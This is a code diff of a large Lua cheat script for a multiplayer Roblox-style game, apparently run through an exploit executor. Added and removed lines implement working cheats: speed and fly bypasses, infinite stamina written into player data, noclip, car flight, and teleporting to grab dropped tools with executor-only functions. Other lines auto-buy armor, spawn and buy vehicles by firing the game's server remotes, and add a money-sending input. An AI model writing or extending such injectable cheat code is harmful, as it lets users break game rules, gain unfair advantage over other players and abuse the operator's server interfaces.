+        ADD_SLD(C_MOV, "Speed Value", 0, 1000, _G.EXE.GUN_MODS.WalkBypassSpeed or 50, function(v)
             _G.EXE.GUN_MODS.WalkBypassSpeed = v
         end)
         local flyConnection
@@ -5735,380 +5544,82 @@ local function BUILD_NYH_UI()
                 end
             end
         end)
-        ADD_SLD(C_MOV, "Fly Speed", 0, 1000, _G.EXE.GUN_MODS.FlySpeed, function(v)
+        ADD_SLD(C_MOV, "Fly Speed", 0, 1000, _G.EXE.GUN_MODS.FlySpeed or 50, function(v)
             _G.EXE.GUN_MODS.FlySpeed = v
         end)
         infStaminaActive = false
         ADD_TGL_KB(C_MOV, "Inf Stamina", false, nil, function(v)
             infStaminaActive = v
             NOTIFY("Movement", "Inf Stamina: " .. (v and "Enabled" or "Disabled"), 2)
-            if v then
-                task.spawn(function()
-                    while infStaminaActive do
-                        pcall(function()
-                            local path = game:GetService("ReplicatedStorage").PlayerData[game.Players.LocalPlayer.Name]
-                                .Server
-                            if path:FindFirstChild("ActiveStamina") then
-                                path.ActiveStamina.Value = 999999999 -- Límite seguro (bajo los 2.14 billones de 32 bits)
-                            end
-                            if path:FindFirstChild("Stamina") then
-                                path.Stamina.Value = 999999999
-                            end
-                            if path:FindFirstChild("MaxStamina") then
-                                path.MaxStamina.Value = 999999999
-                            end
-                        end)
-                        task.wait(0.1)
-                    end
-                end)
-            end
         end)
-
-        ADD_TGL_KB(C_MOV, "Auto Armor", false, nil, function(v)
-            _G.EXE.AUTO_ARMOR = v
-            NOTIFY("Movement", "Auto Armor: " .. (v and "Enabled" or "Disabled"), 2)
-            if v then
-                task.spawn(function()
-                    while _G.EXE.AUTO_ARMOR do
-                        local char = LPLR.Character
-                        local hum = char and char:FindFirstChildOfClass("Humanoid")
-                        local armorVal = char and char:FindFirstChild("Armor")
-
-                        if hum and hum.Health > 0 and armorVal and armorVal:IsA("ValueBase") then
-                            local badges = game:GetService("ReplicatedStorage"):FindFirstChild("PlayerData") and
-                                game:GetService("ReplicatedStorage").PlayerData:FindFirstChild(LPLR.Name) and
-                                game:GetService("ReplicatedStorage").PlayerData[LPLR.Name]:FindFirstChild("Statistics") and
-                                game:GetService("ReplicatedStorage").PlayerData[LPLR.Name].Statistics:FindFirstChild(
-                                    "Badges")
-
-                            local hasTempered = badges and badges:FindFirstChild("Tempered")
-                            local currentThreshold = _G.EXE.AUTO_ARMOR_THRESHOLD or 20
-
-                            if not hasTempered and currentThreshold > 49 then
-                                currentThreshold = 49
-                            end
-
-                            if armorVal.Value < currentThreshold then
-                                local buyCount = hasTempered and 3 or 2
-                                local item = SM_REF["Ling Enterprises"].Misc["+25 Armor"]
-                                local remote = game:GetService("ReplicatedStorage").RemoteFunctions.StorePurchase
-
-                                if item and remote then
-                                    for i = 1, buyCount do
-                                        remote:InvokeServer(item)
-                                        task.wait(0.3)
-                                    end
-                                    NOTIFY("Auto Armor", "Armor restocked (" .. buyCount .. "x)", 2)
-                                end
-                                task.wait(2)
-                            end
-                        end
-                        task.wait(1)
-                    end
-                end)
-            end
+        ADD_TGL_KB(C_MOV, "Anti Car Hit", false, nil, function(v)
+            antiCarHitActive = v
+            NOTIFY("Movement", "Anti Car Hit: " .. (v and "Enabled" or "Disabled"), 2)
         end)
-
-        if _G.EXE.AUTO_ARMOR_THRESHOLD == 70 then _G.EXE.AUTO_ARMOR_THRESHOLD = 20 end
-        local ArmorSld
-        ArmorSld = ADD_SLD(C_MOV, "Armor Threshold", 1, 74, _G.EXE.AUTO_ARMOR_THRESHOLD or 20, function(v)
-            local badges = game:GetService("ReplicatedStorage"):FindFirstChild("PlayerData") and
-                game:GetService("ReplicatedStorage").PlayerData:FindFirstChild(LPLR.Name) and
-                game:GetService("ReplicatedStorage").PlayerData[LPLR.Name]:FindFirstChild("Statistics") and
-                game:GetService("ReplicatedStorage").PlayerData[LPLR.Name].Statistics:FindFirstChild("Badges")
-
-            local hasTempered = badges and badges:FindFirstChild("Tempered")
-
-            if not hasTempered and v > 49 then
-                v = 49
-                ArmorSld:SET(49) -- Fuerza al slider a volver visualmente al 49
-                NOTIFY("Auto Armor", "Need 'Tempered' badge to exceed 49 armor", 2)
-            end
-
-            _G.EXE.AUTO_ARMOR_THRESHOLD = v
-        end)
-
-        -- [[ DROPPED TOOLS LOGIC FROM PICKUP.LUA ]]
-        local function getPos(tool)
-            local dp = tool:WaitForChild("DropPosition", 1) or tool:FindFirstChild("DropPosition", true)
-            if dp then
-                if dp:IsA("BasePart") then return dp.CFrame end
-                if dp:IsA("Attachment") then return dp.WorldCFrame end
-                if dp:IsA("Vector3Value") then return CFrame.new(dp.Value) end
-                if dp:IsA("CFrameValue") then return dp.Value end
-            end
-            local p = tool:FindFirstChildOfClass("BasePart", true) or tool:FindFirstChild("Handle", true)
-            return p and p.CFrame or nil
-        end
-
-        local function pickupTool(tool, returnPos)
-            local char = LPLR.Character
-            local root = char and char:FindFirstChild("HumanoidRootPart")
-            if not root then return end
-            local pos = getPos(tool)
-            local dp = tool:FindFirstChild("DropPosition")
-            local prompt = dp and dp:FindFirstChild("ProximityPrompt") or
-                tool:FindFirstChildOfClass("ProximityPrompt", true)
-            if pos and prompt then
-                local oldCF = root.CFrame
-                root.CFrame = pos * CFrame.new(0, 0.5, 0)
-                task.wait(0.2)
-                if fireproximityprompt then
-                    fireproximityprompt(prompt)
-                    task.wait(0.1)
-                    fireproximityprompt(prompt)
-                else
-                    prompt:InputHoldBegin()
-                    task.wait(prompt.HoldDuration + 0.1)
-                    prompt:InputHoldEnd()
-                end
-                task.wait(0.15)
-                if returnPos then root.CFrame = oldCF end
-            end
-        end
 
         local C_DRP = MK_CARD(ML, "Dropped Tools", "rbxassetid://10734950309")
-        local D_DRV = ADD_DRP(C_DRP, "Select Tool / Action", function(v)
-            if v == "Pickup All" then
-                local tools = workspace.DroppedTools:GetChildren()
-                if #tools > 0 then
-                    local oldCF = LPLR.Character.HumanoidRootPart.CFrame
-                    for _, t in ipairs(tools) do
-                        pickupTool(t, false)
-                        task.wait(0.2)
-                    end
-                    LPLR.Character.HumanoidRootPart.CFrame = oldCF
-                    NOTIFY("Pickup", "All objects collected!", 3)
-                else
-                    NOTIFY("Pickup", "No tools found!", 3)
-                end
-            else
-                local tool = workspace.DroppedTools:FindFirstChild(v)
-                if tool then
-                    pickupTool(tool, true)
-                end
-            end
-        end)
 
-        local function refresh_tools()
-            local names = { "Pickup All" }
-            for _, t in ipairs(workspace.DroppedTools:GetChildren()) do
-                table.insert(names, t.Name)
-            end
-            D_DRV.REFRESH(names)
-        end
-
-        workspace.DroppedTools.ChildAdded:Connect(refresh_tools)
-        workspace.DroppedTools.ChildRemoved:Connect(refresh_tools)
-        refresh_tools()
-        local isCarFlying = false
-        local currentVehicle = nil
-        local flyBV, flyBG, flyAttachment
-        local welderFolder = nil
-        local carFlyConnection
-
-        local function setCarWelds(val, vehicle)
-            if not vehicle then return end
-            if val then
-                if welderFolder then welderFolder:Destroy() end
-                welderFolder = Instance.new("Folder")
-                welderFolder.Name = "FlyWelders"
-                welderFolder.Parent = vehicle
-                local functional = vehicle:FindFirstChild("Functional")
-                local mass = functional and functional:FindFirstChild("Mass") or vehicle.PrimaryPart or
-                    vehicle:FindFirstChildOfClass("BasePart")
-                if not mass then return end
-                local wheels = functional and functional:FindFirstChild("Wheels")
-                if wheels then
-                    for _, wheel in pairs(wheels:GetChildren()) do
-                        if wheel:IsA("BasePart") then
-                            local weld = Instance.new("WeldConstraint")
-                            weld.Part0 = wheel
-                            weld.Part1 = mass
-                            weld.Parent = welderFolder
-                        end
-                    end
-                end
-            else
-                if welderFolder then
-                    welderFolder:Destroy()
-                    welderFolder = nil
-                end
-            end
-        end
-
-        local function setCarNoclip(val, vehicle)
-            if vehicle then
-                for _, v in pairs(vehicle:GetDescendants()) do
-                    if v:IsA("BasePart") then
-                        v.CanCollide = not val
-                        v.CanTouch = not val
-                        v.CanQuery = not val
-                    end
-                end
-            end
-            local char = LPLR.Character
-            if char then
-                for _, p in pairs(char:GetDescendants()) do
-                    if p:IsA("BasePart") then
-                        if val then
-                            p.CanCollide = false
-                            p.CanTouch = false
-                            p.CanQuery = false
-                        else
-                            -- Fix para evitar el bug de la baseplate (el del WalkSpeed)
-                            if p.Name == "Head" or p.Name == "Torso" or p.Name == "UpperTorso" or p.Name == "LowerTorso" or p.Name == "HumanoidRootPart" then
-                                p.CanCollide = true
-                            else
-                                p.CanCollide = false
-                            end
-                            p.CanTouch = true
-                            p.CanQuery = true
-                        end
-                    end
-                end
-            end
-        end
-
-        local function cleanupCarFly()
-            isCarFlying = false
-            if carFlyConnection then
-                carFlyConnection:Disconnect()
-                carFlyConnection = nil
-            end
-            setCarWelds(false, currentVehicle)
-            setCarNoclip(false, currentVehicle)
-            if flyBV then
-                flyBV:Destroy()
-                flyBV = nil
-            end
-            if flyBG then
-                flyBG:Destroy()
-                flyBG = nil
-            end
-            if flyAttachment then
-                flyAttachment:Destroy()
-                flyAttachment = nil
-            end
-            currentVehicle = nil
-        end
-
-        local function get_vic()
-            local char = LPLR.Character
-            local hum = char and char:FindFirstChildOfClass("Humanoid")
-            local seat = hum and hum.SeatPart
-            if seat and seat:IsA("VehicleSeat") then
-                return seat:FindFirstAncestorOfClass("Model"), seat
-            end
-            return nil, nil
-        end
-
-        local CarFlyTgl = nil
-        CarFlyTgl = ADD_TGL_KB(C_MOV, "Car Fly", false, nil, function(v)
+        local autoScrapeConn
+        ADD_TGL_KB(C_DRP, "Auto Collect Tools", false, nil, function(v)
             if v then
-                local model, seat = get_vic()
-                if not model then
-                    NOTIFY("Car Fly", "Sit in a car first.", 3)
-                    if CarFlyTgl then CarFlyTgl:SET(false) end
-                    return
-                end
-
-                NOTIFY("Movement", "Car Fly: Enabled", 2)
-                isCarFlying = true
-                currentVehicle = model
-                setCarWelds(true, model)
-                setCarNoclip(true, model)
-
-                local root = model.PrimaryPart or seat or model:FindFirstChildOfClass("BasePart")
-                flyAttachment = Instance.new("Attachment")
-                flyAttachment.Name = "CarFlyNode"
-                flyAttachment.Parent = root
-
-                flyBV = Instance.new("LinearVelocity")
-                flyBV.Attachment0 = flyAttachment
-                flyBV.MaxForce = math.huge
-                flyBV.VelocityConstraintMode = Enum.VelocityConstraintMode.Vector
-                flyBV.VectorVelocity = Vector3.new(0, 0, 0)
-                flyBV.RelativeTo = Enum.ActuatorRelativeTo.World
-                flyBV.Parent = root
-
-                flyBG = Instance.new("AngularVelocity")
-                flyBG.Attachment0 = flyAttachment
-                flyBG.MaxTorque = math.huge
-                flyBG.AngularVelocity = Vector3.new(0, 0, 0)
-                flyBG.RelativeTo = Enum.ActuatorRelativeTo.World
-                flyBG.Parent = root
-
-                carFlyConnection = RS.Heartbeat:Connect(function(dt)
-                    if not isCarFlying or not currentVehicle then return end
-
-                    local char = LPLR.Character
-                    local hum = char and char:FindFirstChildOfClass("Humanoid")
-                    local seat = hum and hum.SeatPart
-
-                    if not seat or not seat:IsDescendantOf(currentVehicle) then
-                        if CarFlyTgl then CarFlyTgl:SET(false) end
-                        cleanupCarFly()
-                        return
-                    end
-
-                    -- MANTENIMIENTO NOCLIP (Vehículo y Personaje)
-                    for _, p in pairs(currentVehicle:GetDescendants()) do
-                        if p:IsA("BasePart") and (p.CanCollide or p.CanTouch or p.CanQuery) then
-                            p.CanCollide = false
-                            p.CanTouch = false
-                            p.CanQuery = false
+                NOTIFY("Dropped Tools", "Auto Collect Active", 2)
+                autoScrapeConn = RS.Heartbeat:Connect(function()
+                    local hrp = LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart")
+                    if hrp then
+                        -- Only run a lighter scan cycle (game.Workspace.Slugs or direct workspace children)
+                        -- to avoid intense frame drops checking every descendant on Heartbeat
+                        for _, folder in ipairs({ workspace, workspace:FindFirstChild("Slugs") }) do
+                            if folder then
+                                for _, item in ipairs(folder:GetChildren()) do
+                                    if item:IsA("Tool") and item:FindFirstChild("Handle") then
+                                        local handle = item.Handle
+                                        if handle:FindFirstChildWhichIsA("TouchTransmitter") then
+                                            pcall(function()
+                                                firetouchinterest(hrp, handle, 0)
+                                                firetouchinterest(hrp, handle, 1)
+                                            end)
+                                        end
+                                    end
+                                end
+                            end
                         end
                     end
-                    for _, p in pairs(char:GetDescendants()) do
-                        if p:IsA("BasePart") and p.CanCollide then
-                            p.CanCollide = false
-                        end
-                    end
-
-                    if not flyBV or not flyBG then return end
-
-                    local cam = workspace.CurrentCamera
-                    local speed = _G.EXE.GUN_MODS.CarFlySpeed or 100
-                    local rotSpeed = 3
-                    local finalVelocity = Vector3.new(0, 0, 0)
-                    local finalAngularVelocity = Vector3.new(0, 0, 0)
-
-                    if UIS:IsKeyDown(Enum.KeyCode.W) then
-                        finalVelocity = finalVelocity + (cam.CFrame.LookVector * speed)
-                    elseif UIS:IsKeyDown(Enum.KeyCode.S) then
-                        finalVelocity = finalVelocity - (cam.CFrame.LookVector * speed)
-                    end
-
-                    if UIS:IsKeyDown(Enum.KeyCode.D) then
-                        finalAngularVelocity = finalAngularVelocity + Vector3.new(0, -rotSpeed, 0)
-                    elseif UIS:IsKeyDown(Enum.KeyCode.A) then
-                        finalAngularVelocity = finalAngularVelocity + Vector3.new(0, rotSpeed, 0)
-                    end
-
-                    if UIS:IsKeyDown(Enum.KeyCode.E) then
-                        finalVelocity = finalVelocity + Vector3.new(0, speed, 0)
-                    elseif UIS:IsKeyDown(Enum.KeyCode.Q) then
-                        finalVelocity = finalVelocity + Vector3.new(0, -speed, 0)
-                    end
-
-                    if UIS:IsKeyDown(Enum.KeyCode.Space) then
-                        finalVelocity = Vector3.new(0, 0, 0)
-                        finalAngularVelocity = Vector3.new(0, 0, 0)
-                    end
-
-                    flyBV.VectorVelocity = finalVelocity
-                    flyBG.AngularVelocity = finalAngularVelocity
                 end)
             else
-                NOTIFY("Movement", "Car Fly: Disabled", 2)
-                cleanupCarFly()
+                NOTIFY("Dropped Tools", "Auto Collect Disabled", 2)
+                if autoScrapeConn then
+                    autoScrapeConn:Disconnect()
+                    autoScrapeConn = nil
+                end
             end
         end)
 
-        ADD_SLD(C_MOV, "Car Fly Speed", 0, 1000, _G.EXE.GUN_MODS.CarFlySpeed, function(v)
-            _G.EXE.GUN_MODS.CarFlySpeed = v
-        end)
+
+
+        -- [ UTILITIES ]
+        local function FIND_NEAREST_PARK()
+            local best = nil
+            local dist = math.huge
+            local parks = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("VehicleParks") and
+                workspace.Map.VehicleParks:FindFirstChild("Spawns")
+            if not parks then return nil end
+
+            local hrp = LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart")
+            if not hrp then return nil end
+
+            for _, slot in ipairs(parks:GetChildren()) do
+                if slot:IsA("BasePart") then
+                    local d = (hrp.Position - slot.Position).Magnitude
+                    if d < dist then
+                        dist = d
+                        best = slot
+                    end
+                end
+            end
+            return best
+        end
+
+
 
         local noclipConnection
         ADD_TGL_KB(C_MOV, "Noclip", false, nil, function(v)
@@ -6133,195 +5644,208 @@ local function BUILD_NYH_UI()
         end)
 
         local C_TOL = MK_CARD(MR, "Car Spawner", "rbxassetid://122122158199543")
-        local function get_vic()
-            local char = LPLR.Character
-            if not char then return nil end
-            local hum = char:FindFirstChildOfClass("Humanoid")
-            if hum and hum.SeatPart and hum.SeatPart:IsA("VehicleSeat") then
-                return hum.SeatPart:FindFirstAncestorOfClass("Model")
-            end
-            local vf = workspace:FindFirstChild("Vehicles")
-            if vf then
-                for _, car in pairs(vf:GetChildren()) do
-                    if car:IsA("Model") and car:GetAttribute("Car_Owner") == LPLR.Name then
+        local V_EV = game.ReplicatedStorage:WaitForChild("Events"):WaitForChild("VehicleEvent")
+
+        local function GET_MY_CAR()
+            local cars = workspace:FindFirstChild("Cars")
+            if not cars then return nil end
+
+            local myId = tostring(LPLR.UserId)
+            local myName = LPLR.Name
+
+            for _, car in pairs(cars:GetChildren()) do
+                if car:IsA("Model") then
+                    -- 1. Check Attributes
+                    local owner = car:GetAttribute("OwnerId") or car:GetAttribute("Owner") or car:GetAttribute("OwnerID")
+                    if tostring(owner) == myId or tostring(owner) == myName then
                         return car
                     end
-                end
-                local cl, md = nil, 50
-                for _, car in pairs(vf:GetChildren()) do
-                    if car:IsA("Model") then
-                        local r = car.PrimaryPart or car:FindFirstChildOfClass("BasePart")
-                        if r then
-                            local d = (char.PrimaryPart.Position - r.Position).Magnitude
-                            if d < md then
-                                md = d; cl = car
+
+                    -- 2. Check Name (some games use Car_UserId)
+                    if car.Name:find(myId) or car.Name:find(myName) then
+                        return car
+                    end
+
+                    -- 3. Check for specific children (ValueObjects)
+                    local ov = car:FindFirstChild("Owner") or car:FindFirstChild("OwnerId") or
+                        car:FindFirstChild("Creator")
+                    if ov and (tostring(ov.Value) == myId or tostring(ov.Value) == myName) then
+                        return car
+                    end
+
+                    -- 4. Deep search in parts (last resort)
+                    for _, obj in ipairs(car:GetDescendants()) do
+                        if obj:IsA("StringValue") or obj:IsA("NumberValue") or obj:IsA("IntValue") then
+                            if tostring(obj.Value) == myId or tostring(obj.Value) == myName then
+                                return car
                             end
                         end
                     end
                 end
-                return cl
             end
             return nil
         end
 
-        local function do_tp_to_car()
-            local car = get_vic()
-            if car and LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart") then
-                -- Buscamos el asiento o la masa para precisión total
-                local targetPart = car:FindFirstChildOfClass("VehicleSeat")
-                    or (car:FindFirstChild("Functional") and car.Functional:FindFirstChild("Mass"))
-                    or car.PrimaryPart
-                    or car:FindFirstChildOfClass("BasePart")
-
-                if targetPart then
-                    LPLR.Character.HumanoidRootPart.CFrame = targetPart.CFrame * CFrame.new(0, 5, 0)
-                    NOTIFY("Car Tools", "Teleported to " .. car.Name, 2)
-                else
-                    NOTIFY("Car Tools", "Could not find a valid part to TP!", 3)
-                end
-            end
-        end
-
         local D_TOL = ADD_DRP(C_TOL, "Car Tools", function(v)
-            if v == "tp to car" then
-                do_tp_to_car()
-            elseif v == "fix car" then
-                local car = get_vic()
-                if not car then
-                    NOTIFY("Car Tools", "No vehicle found!", 2)
-                    return
-                end
+            if v == "Flip Car" then
+                local char = LPLR.Character
+                local hum = char and char:FindFirstChildOfClass("Humanoid")
+                local veh = nil
 
-                local functional = car:FindFirstChild("Functional")
-                local root = functional and functional:FindFirstChild("Mass") or car.PrimaryPart or
-                    car:FindFirstChildOfClass("BasePart")
-                if root then
-                    car:PivotTo(car:GetPivot() + Vector3.new(0, 10, 0))
-                    local att = Instance.new("Attachment", root)
-                    local gyro = Instance.new("AlignOrientation", root)
-                    gyro.Attachment0 = att
-                    gyro.Mode = Enum.OrientationAlignmentMode.OneAttachment
-                    gyro.MaxTorque = math.huge
-                    gyro.Responsiveness = 200
-                    local _, yRot, _ = car:GetPivot():ToEulerAnglesYXZ()
-                    gyro.CFrame = CFrame.Angles(0, yRot, 0)
-                    for _, v in pairs(car:GetDescendants()) do
-                        if v:IsA("BasePart") then
-                            v.Anchored = false
-                            v.AssemblyLinearVelocity = Vector3.new(0, -1, 0)
+                if hum and hum.SeatPart and hum.SeatPart.Name == "DriveSeat" then
+                    veh = hum.SeatPart.Parent
+                else
+                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                    if hrp then
+                        local rayParams = RaycastParams.new()
+                        rayParams.FilterType = Enum.RaycastFilterType.Include
+                        local carsFolder = workspace:FindFirstChild("Cars")
+                        if carsFolder then
+                            rayParams.FilterDescendantsInstances = { carsFolder }
+                            local ray = workspace:Raycast(hrp.Position, Vector3.new(0, -6, 0), rayParams)
+                            if ray and ray.Instance then
+                                veh = ray.Instance:FindFirstAncestorOfClass("Model")
+                            end
+                        end
+
+                        -- Very strict nearby scan (only 7 studs)
+                        if not veh and carsFolder then
+                            for _, c in pairs(carsFolder:GetChildren()) do
+                                if c:IsA("Model") and c:FindFirstChild("DriveSeat") then
+                                    if (hrp.Position - c.DriveSeat.Position).Magnitude < 7 then
+                                        veh = c
+                                        break
+                                    end
+                                end
+                            end
                         end
                     end
+                end
+
+                if veh and veh:IsDescendantOf(workspace:FindFirstChild("Cars") or workspace) then
+                    local target = veh:FindFirstChild("PrimaryPart") or veh:FindFirstChild("DriveSeat") or
+                        veh:FindFirstChildWhichIsA("BasePart", true)
+                    if target then
+                        veh:PivotTo(CFrame.new(target.Position + Vector3.new(0, 6, 0)) * CFrame.Angles(0, 0, 0))
+                        NOTIFY("Car Spawner", "Vehicle flipped!", 2)
+                    end
+                else
+                    NOTIFY("Car Spawner", "Get In Ur Car Bro!", 3)
+                end
+            elseif v == "Tp to Car" then
+                local car = GET_MY_CAR()
+                if car then
+                    LPLR.Character:PivotTo(car:GetPivot() + Vector3.new(0, 5, 0))
+                    NOTIFY("Car Spawner", "Teleported to car!", 2)
+                else
+                    NOTIFY("Car Spawner", "Your car wasn't found!", 3)
+                end
+            end
+        end); D_TOL:ADD_MANY({ "Flip Car", "Tp to Car" })
+
+        local D_MYC
+        D_MYC = ADD_DRP(C_TOL, "My Cars", function(v)
+            local park = FIND_NEAREST_PARK()
+            if park then
+                local hrp = LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    hrp.CFrame = park.CFrame + Vector3.new(0, 3, 0)
                     task.wait(0.5)
-                    gyro:Destroy()
-                    att:Destroy()
-                    NOTIFY("Car Tools", "Vehicle fixed!", 2)
+                    V_EV:FireServer("SpawnVehicle", v)
+                    NOTIFY("Car Spawner", "Spawning " .. v .. " (Teleported)", 3)
+                    task.delay(1.5, function()
+                        if D_MYC then D_MYC:RESET() end
+                    end)
+                    return
                 end
             end
+            V_EV:FireServer("SpawnVehicle", v)
+            NOTIFY("Car Spawner", "Spawning " .. v .. "...", 2)
+            task.delay(1.5, function()
+                if D_MYC then D_MYC:RESET() end
+            end)
         end)
-        D_TOL.REFRESH({ "tp to car", "fix car" })
 
-        local currentCars = {}
-        local function refresh_car_list(dropdown)
-            local data = game:GetService("ReplicatedStorage"):FindFirstChild("PlayerData")
-            local pData = data and data:FindFirstChild(LPLR.Name)
-            local stats = pData and pData:FindFirstChild("Statistics")
-            local vehicles = stats and stats:FindFirstChild("Vehicles")
 
-            if vehicles then
-                currentCars = {}
-                local names = {}
-                for _, car in pairs(vehicles:GetChildren()) do
-                    currentCars[car.Name] = car
-                    table.insert(names, car.Name)
-                end
-                table.sort(names)
-                dropdown.REFRESH(names)
-            end
-        end
-
-        local D_MYC = ADD_DRP(C_TOL, "My Cars", function(v)
-            local obj = currentCars[v]
-            if obj then
-                local RF = game:GetService("ReplicatedStorage"):FindFirstChild("RemoteFunctions")
-                local spawnEvent = RF and RF:FindFirstChild("VehicleSpawn")
-                if spawnEvent then
-                    spawnEvent:InvokeServer(obj)
-                    NOTIFY("Car Spawner", "Invocando: " .. v, 3)
-                end
-            end
-        end)
 
         -- [ CAR DEALER SECTION ]
         local C_DEAL = MK_CARD(MR, "Car Dealer", "rbxassetid://121291102761859")
-
-        local dealerVehicles = {
-            ["[Cars] Dodge Charger SRT Hellcat"] = { Path = "Cars.Dodge Charger SRT Hellcat", Price = 199999 },
-            ["[Cars] Dodge Charger Scatpack"] = { Path = "Cars.Dodge Charger Scatpack", Price = 999999 },
-            ["[Cars] Honda Legend"] = { Path = "Cars.Honda Legend", Price = 1499 },
-            ["[Cars] Vapid Speedo (Pack Courier)"] = { Path = "Cars.Vapid Speedo (Pack Courier)", Price = 19999 },
+        local sel_deal = ""
+        local D_CAR = ADD_DRP(C_DEAL, "Select Vehicle", function(v) sel_deal = v end)
+        local ALL_CARS = {
+            { "Dodge Charger SRT Hellcat", "79k" }, { "Porsche 911 GT3RS", "96k" }, { "Cadillac CTS-V", "125k" },
+            { "Ford Mustang",              "78.5k" }, { "2011 Toyota Camry", "8.5k" }, { "Scat Pack", "82k" },
+            { "Cadilac Escalade", "135k" }, { "64 Impala", "64.5k" }, { "Corvette", "95k" },
+            { "Chevy 2500",       "40k" }, { "The Hawk", "112k" }, { "Mercedes AMG", "103k" },
+            { "Range Rover", "73k" }, { "Urus", "257k" }, { "Lamborghini Veneno", "2.5m" },
+            { "Mclaren",     "235k" }, { "Rolls Royce", "547k" }, { "BMW 330I", "49k" },
+            { "Lexus LS400",    "9.8k" }, { "Chrysler 300 Hellcat", "45k" }, { "Chevrolet Tahoe", "63k" },
+            { "WideBody Demon", "135k" }, { "GTR R35 Widebody", "235k" }, { "DirtBike", "800" },
+            { "Harley Davidson Softail", "23k" }, { "Audi R8 Widebody", "245k" }, { "Kawasaki Ninja H2R", "34.6k" },
+            { "Ford F-350",              "451k" }, { "BP Brabus B63 6x6", "Game Pass" }, { "1987 Buick Regal GNX", "345k" },
+            { "Shelby GT500", "285k" }, { "Maybach S 650", "310k" }, { "2020TRX", "285k" },
+            { "Benz CLS 53",  "185k" }, { "Camaro ZL1", "340k" }, { "Alfa Romeo", "295k" },
+            { "Bugatti Vision", "3.5m" }, { "Sprinter Van", "55k" }, { "WideBody Supra", "650k" },
+            { "GoKart",         "8.5k" }, { "CyberTruck", "445k" }, { "Lamborghini Huracan", "1.8m" },
+            { "4 Wheeler",         "6.5k" }, { "RollsRoyce Cullinan", "850k" }, { "Mercedes Benz GLE53", "450k" },
+            { "Aston Marton DBX3", "650k" }, { "Mini k Truck", "14k" }, { "Jeep Grand Cherokee srt-8", "46k" },
+            { "M4 Comp",    "450k" }, { "Ferrari 812", "3.5m" }, { "Dodge Durango", "195k" },
+            { "Chevy Donk", "265k" }, { "Dodge Charger SRT", "175k" }, { "G wagon", "2.8m" },
+            { "2011 Lincoln Town Car",                 "32k" }, { "Lincoln Limousine", "210k" }, { "Infiniti G37", "160k" },
+            { "2023 Corvette C8 Stingray Convertible", "548k" }, { "Kia 5K GT", "135k" }
         }
 
-        local selCarName = "[Cars] Dodge Charger SRT Hellcat"
-
-        local D_CAR = ADD_DRP(C_DEAL, "Select Vehicle", function(v)
-            selCarName = v
-        end)
-
-        local function FormatPrice(n)
-            if n >= 1000000 then
-                return string.format("%.1fM", n / 1000000):gsub("%.0M", "M")
-            elseif n >= 1000 then
-                return string.format("%.1fk", n / 1000):gsub("%.0k", "k")
+        local function RefreshDealerList()
+            local displayNames = {}
+            for _, car in ipairs(ALL_CARS) do
+                table.insert(displayNames, car[1] .. " | " .. car[2])
             end
-            return tostring(n)
-        end
-
-        for k, _ in pairs(dealerVehicles) do
-            D_CAR:ADD(k .. " ($" .. FormatPrice(dealerVehicles[k].Price) .. ")", k)
+            pcall(function() D_CAR:REFRESH(displayNames) end)
         end
 
         ADD_BTN(C_DEAL, "Purchase Vehicle", function()
-            local data = game:GetService("ReplicatedStorage"):FindFirstChild("PlayerData")
-            local pData = data and data:FindFirstChild(LPLR.Name)
-            local stats = pData and pData:FindFirstChild("Statistics")
-            local cash = stats and stats:FindFirstChild("Cash")
-
-            local carData = dealerVehicles[selCarName]
-            if not carData then return end
-
-            if not cash or cash.Value < carData.Price then
-                NOTIFY("Car Dealer", "Insufficient Funds!", 3)
-                return
-            end
-
-            local storeMenu = game:GetService("ReplicatedStorage"):FindFirstChild("StoreMenus")
-            local dealership = storeMenu and storeMenu:FindFirstChild("Dealership")
-            local cType, cName = carData.Path:match("([^.]+)%.(.+)")
-            local carRef = dealership and dealership:FindFirstChild(cType) and dealership[cType]:FindFirstChild(cName)
-
-            if carRef then
-                local event = game:GetService("ReplicatedStorage"):FindFirstChild("RemoteFunctions") and
-                    game:GetService("ReplicatedStorage").RemoteFunctions:FindFirstChild("StorePurchase")
-                if event then
-                    NOTIFY("Car Dealer", "Purchasing " .. selCarName .. "...", 3)
-                    event:InvokeServer(carRef, "Black", "Beige", "Metallic")
-                end
-            else
-                NOTIFY("Car Dealer", "Vehicle reference not found!", 3)
+            if sel_deal ~= "" then
+                local realName = sel_deal:split(" | ")[1]
+                V_EV:FireServer("BuyVehicle", realName)
+                NOTIFY("Car Dealer", "Requesting purchase: " .. realName, 3)
+                task.wait(0.5)
+                RefreshDealerList()
             end
         end)
 
-        -- Monitor real-time changes
-        task.spawn(function()
-            local data = game:GetService("ReplicatedStorage"):WaitForChild("PlayerData", 10)
-            local pData = data and data:WaitForChild(LPLR.Name, 10)
-            local stats = pData and pData:WaitForChild("Statistics", 10)
-            local vFolder = stats and stats:WaitForChild("Vehicles", 10)
+        RefreshDealerList()
 
-            if vFolder then
-                refresh_car_list(D_MYC)
-                vFolder.ChildAdded:Connect(function() refresh_car_list(D_MYC) end)
-                vFolder.ChildRemoved:Connect(function() refresh_car_list(D_MYC) end)
+        -- Monitor owned cars (Using working Utility module)
+        task.spawn(function()
+            local utility
+            pcall(function()
+                utility = require(game:GetService("ReplicatedStorage"):WaitForChild("Functions"):WaitForChild("Utility"))
+            end)
+
+            while task.wait(5) do
+                if MAIN.Visible then
+                    local names = {}
+                    if utility then
+                        pcall(function()
+                            local data = utility:GetClientData()
+                            if data and data.Cars then
+                                for _, car in pairs(data.Cars) do
+                                    -- Recuperar el nombre real del coche según la tabla del juego
+                                    local n = (typeof(car) == "table" and (car.Name or car.VehicleName or car.Model)) or
+                                        tostring(car)
+                                    table.insert(names, n)
+                                end
+                            end
+                        end)
+                    end
+
+                    if #names > 0 then
+                        table.sort(names)
+                        task.spawn(function()
+                            D_MYC:REFRESH(names)
+                        end)
+                    end
+                end
             end
         end)
 
@@ -6347,82 +5871,330 @@ local function BUILD_NYH_UI()
         game.Players.PlayerAdded:Connect(update_plrs)
         game.Players.PlayerRemoving:Connect(update_plrs)
 
-        ADD_INP(C_EXT, "Amount to Send", "0", function(v)
+        local AMT_INP = ADD_INP(C_EXT, "Amount to Send", "0", function(v)
             sndAmt = v:gsub("[^%d]", "")
         end)
 
